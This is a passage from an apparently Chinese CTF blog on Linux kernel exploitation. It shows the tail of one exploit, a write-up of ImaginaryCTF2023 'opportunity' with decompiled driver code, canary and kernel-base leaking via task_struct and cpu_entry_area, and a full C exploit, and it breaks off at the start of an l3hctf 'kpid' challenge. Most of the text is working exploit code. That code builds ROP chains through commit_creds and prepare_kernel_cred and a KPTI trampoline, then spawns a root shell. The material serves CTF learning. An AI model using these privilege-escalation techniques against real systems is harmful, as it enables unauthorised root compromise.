class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line"><span class="string">&quot;pushf;&quot;</span></span><br><span class="line"><span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]State Saved!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_commit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">__asm__</span><br><span class="line">(</span><br><span class="line"> <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mov fetch, eax;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">);</span><br><span class="line">commit_creds = ksymtab_commit_creds + fetch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]commit_creds() Leaked: %lx\n&quot;</span>, commit_creds);</span><br><span class="line"></span><br><span class="line">leak_prep();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prep</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> payload[<span class="number">50</span>];</span><br><span class="line"><span class="type">int</span> offset = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">payload[offset++] = canary;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = pop_rax;</span><br><span class="line">payload[offset++] = ksymtab_prepare_kcred;</span><br><span class="line">payload[offset++] = mov_eax_pop;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = kpti_trampoline;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = (<span class="type">unsigned</span> <span class="type">long</span>)fetch_prep;</span><br><span class="line">payload[offset++] = user_cs;</span><br><span class="line">payload[offset++] = user_rflags;</span><br><span class="line">payload[offset++] = user_sp;</span><br><span class="line">payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">write(fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_prep</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">__asm__</span><br><span class="line">(</span><br><span class="line"><span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mov fetch, eax;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">);</span><br><span class="line">prepare_kcred = ksymtab_prepare_kcred + fetch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]prepare_kernel_cred() Leaked: %lx\n&quot;</span>, prepare_kcred);</span><br><span class="line"></span><br><span class="line">make_cred();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">make_cred</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> payload[<span class="number">50</span>];</span><br><span class="line"><span class="type">int</span> offset = <span class="number">16</span>;</span><br><span class="line">pop_rdi = image_base + <span class="number">0x6370</span>;</span><br><span class="line"></span><br><span class="line">payload[offset++] = canary;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = pop_rdi;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = prepare_kcred;</span><br><span class="line">payload[offset++] = kpti_trampoline;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = (<span class="type">unsigned</span> <span class="type">long</span>)fetch_cred;</span><br><span class="line">payload[offset++] = user_cs;</span><br><span class="line">payload[offset++] = user_rflags;</span><br><span class="line">payload[offset++] = user_sp;</span><br><span class="line">payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">write(fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_cred</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">__asm__</span><br><span class="line">(</span><br><span class="line"> <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mov cred_struct_ptr, rax;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]ptr to cred struct retrieved: %lx\n&quot;</span>, cred_struct_ptr);</span><br><span class="line"></span><br><span class="line">send_cred();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_cred</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> payload[<span class="number">50</span>];</span><br><span class="line"><span class="type">int</span> offset = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">payload[offset++] = canary;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = pop_rdi;</span><br><span class="line">payload[offset++] = cred_struct_ptr;</span><br><span class="line">payload[offset++] = commit_creds;</span><br><span class="line">payload[offset++] = kpti_trampoline;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = (<span class="type">unsigned</span> <span class="type">long</span>)getshell;</span><br><span class="line">payload[offset++] = user_cs;</span><br><span class="line">payload[offset++] = user_rflags;</span><br><span class="line">payload[offset++] = user_sp;</span><br><span class="line">payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">write(fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]Exploit Success!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]Exploit Unsuccessful.\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ImaginaryCTF2023-opportunity"><a href="#ImaginaryCTF2023-opportunity" class="headerlink" title="ImaginaryCTF2023-opportunity"></a>ImaginaryCTF2023-opportunity</h2><p>照样保护全开</p><p>然后模块中注册的函数中看起来有问题的只有ioctl和write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">device_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  _QWORD v6[<span class="number">36</span>]; <span class="comment">// [rsp-120h] [rbp-120h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v6[<span class="number">35</span>] = v2;</span><br><span class="line">  v6[<span class="number">33</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x1337</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  v4 = v3;</span><br><span class="line">  copy_from_user(v6);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)copy_to_user(v4 + <span class="number">8</span>, v6[<span class="number">0</span>], <span class="number">256LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">device_write</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  _QWORD v4[<span class="number">10</span>]; <span class="comment">// [rsp-50h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v4[<span class="number">9</span>] = v2;</span><br><span class="line">  v4[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  copy_from_user(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ida识别有点问题</p><p>总之ioctl存在一个任意读,然后write存在栈溢出</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>有以上这两个漏洞点了,思路就明确了</p><p>那么首先肯定要通过任意读读来泄露地址和canary</p><p>但是怎么搞呢,直接读取出来的肯定不会包含有我们需要的信息</p><p>不过我们可以利用一个特性,在不考虑<code>harden_usercopy</code>的情况下,copy_to_user的返回值是未成功copy的数量,我们可以以此来判断是否命中</p><p>以上是暴力搜索,不过我们还可以通过cpu_entry_area mapping来获得基址</p><p>那么如何泄露canary,栈上的显然没法泄露出来,不过</p><blockquote><p>该题开启了内核栈canary保护，因此需要泄漏 在用户空间中，进程canary保存在tls结构体中，由fs寄存器指向，通过fs+0x28访问canary，并且低8位全都为0 而在内核空间中，进程canary保存在进程的task_struct中，且低8位同样也全都为0 而通过任意地址读取，可以通过遍历struct task_struct来泄漏自身进程的canary</p></blockquote><p>内核态下canary位于task_struct中,那如何获得task_struct,一种自然还是暴力搜索</p><p>另一种嘛,在泄露了<code>.text</code>的前提下,如果导出了<code>init_task</code>符号,所有的task_struct是通过双向链表连接的,只要通过这个链表就能得到当前进程的task_struct</p><blockquote><p>对于init_task对应的pid 0进程而言，pid和t_pid均为0，stack_canary为低八位为0其他位不为0的8字节数，comm通常为”swapper/0″</p></blockquote><p>但现在还有一个问题,不同版本task_struct之间存在差异,若是有符号表自然能够直接显示出来,但大多数时候题目只给我们一个bzimage,这时候就需要通过特殊标志来定位目标数据了,这样不一定准确,但也没有更好的办法了</p><blockquote><p>特别要注意到，struct list_head children中的next指针指向的是下一个task_struct中children成员 + 0x10，而非task_struct头部或list_head的next指针</p></blockquote><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fuse.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">void</span> *ptr;</span><br><span class="line"><span class="type">char</span> content[<span class="number">0x180</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> kernel_base, init_task, prepare_kernel_cred, commit_creds, kpti_trampoline, pop_rdi, cred, canary;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs,user_ss,user_eflag,rsp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %3;&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq;&quot;</span></span><br><span class="line"><span class="string">&quot;pop %2;&quot;</span></span><br><span class="line">: <span class="string">&quot;=r&quot;</span>(user_cs),<span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_eflag),<span class="string">&quot;=r&quot;</span>(rsp)</span><br><span class="line">:</span><br><span class="line">: <span class="string">&quot;memory&quot;</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dev_read</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> <span class="title">request_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;<span class="type">request_t</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> request));</span><br><span class="line"><span class="type">request_t</span>.ptr = ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ret = ioctl(dev_fd, <span class="number">0x1337</span>, &amp;<span class="type">request_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(data, <span class="type">request_t</span>.content, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dev_write</span><span class="params">(<span class="type">void</span> *data, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> write(dev_fd, data, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">save_state();</span><br><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;bkfish&quot;</span>);</span><br><span class="line"></span><br><span class="line">dev_fd = open(<span class="string">&quot;/dev/window&quot;</span>,O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *data = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line">dev_read((<span class="type">void</span> *)(<span class="number">0xfffffe0000000004</span>), data);</span><br><span class="line"></span><br><span class="line">kernel_base = *(<span class="type">uint64_t</span> *)data - <span class="number">0x1008e00</span>;</span><br><span class="line">init_task = kernel_base + <span class="number">0x201b600</span>;</span><br><span class="line">prepare_kernel_cred = kernel_base + <span class="number">0xffb80</span>;</span><br><span class="line">commit_creds = kernel_base + <span class="number">0xff8a0</span>;</span><br><span class="line">kpti_trampoline = kernel_base + <span class="number">0x10010f0</span> + <span class="number">22</span> + <span class="number">0x20</span>;</span><br><span class="line">pop_rdi = kernel_base + <span class="number">0x1d675</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] kernel_base = 0x%llx\n&quot;</span>, kernel_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] init_task = 0x%llx\n&quot;</span>, init_task);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred = 0x%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] commit_creds = 0x%llx\n&quot;</span>, commit_creds);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] kpti_trampoline = 0x%llx\n&quot;</span>, kpti_trampoline);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> task_struct = init_task + <span class="number">0x9f0</span>;</span><br><span class="line"><span class="type">char</span> comm[<span class="number">0x10</span>];</span><br><span class="line"><span class="keyword">for</span> ( ; ; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">memset</span>(comm, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">dev_read((<span class="type">void</span> *)(task_struct + <span class="number">0x1a8</span>), data);</span><br><span class="line"><span class="built_in">strncpy</span>(comm, data, <span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strncmp</span>(comm, <span class="string">&quot;bkfish&quot;</span>, <span class="number">0x6</span>))</span><br><span class="line">&#123;</span><br><span class="line">dev_read((<span class="type">void</span> *)(task_struct - <span class="number">0x28</span>), data);</span><br><span class="line">canary = *(<span class="type">uint64_t</span> *)data;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line">dev_read((<span class="type">void</span> *)(task_struct - <span class="number">0x10</span>), data);</span><br><span class="line">task_struct = *(<span class="type">uint64_t</span> *)data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] canary = 0x%llx\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line">dev_read((<span class="type">void</span> *)(init_task + <span class="number">0x9f0</span> + <span class="number">0x198</span>), data);</span><br><span class="line">cred = *(<span class="type">uint64_t</span> *)data;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] cred = 0x%llx\n&quot;</span>, cred);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0x8</span>;</span><br><span class="line">ROP[cnt++] = canary;</span><br><span class="line">ROP[cnt++] = <span class="number">0</span>;</span><br><span class="line">ROP[cnt++] = pop_rdi;</span><br><span class="line">ROP[cnt++] = cred;</span><br><span class="line">ROP[cnt++] = commit_creds;</span><br><span class="line">ROP[cnt++] = kpti_trampoline;</span><br><span class="line">ROP[cnt++] = <span class="number">0</span>;</span><br><span class="line">ROP[cnt++] = <span class="number">0</span>;</span><br><span class="line">ROP[cnt++] = (<span class="type">uint64_t</span>)get_shell;</span><br><span class="line">ROP[cnt++] = user_cs;</span><br><span class="line">ROP[cnt++] = user_eflag;</span><br><span class="line">ROP[cnt++] = rsp;</span><br><span class="line">ROP[cnt++] = user_ss;</span><br><span class="line"></span><br><span class="line">dev_write(ROP, <span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="l3hctf-kpid"><a href="#l3hctf-kpid" class="headerlink" title="l3hctf-kpid"></a>l3hctf-kpid</h2><p>惯例,常规保护还是拉满的</p><p>注册了ioctl函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">kpid_act_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5[<span class="number">18</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">16</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">430083</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dest_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      --dest_cnt;</span><br><span class="line">      put_pid(pid);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">360450</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">290817</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">-22LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( fork_cnt )</span><br><span class="line">      &#123;</span><br><span class="line">        v5[<span class="number">4</span>] = <span class="number">17LL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v5[<span class="number">5</span>], <span class="number">0</span>, <span class="number">88</span>);</span><br><span class="line">        <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">        nr = kernel_clone(v5);</span><br><span class="line">        pid = find_vpid((<span class="type">unsigned</span> <span class="type">int</span>)nr);</span><br><span class="line">        <span class="keyword">if</span> ( pid )</span><br><span class="line">        &#123;</span><br><span class="line">          --fork_cnt;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(&amp;unk_276);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span 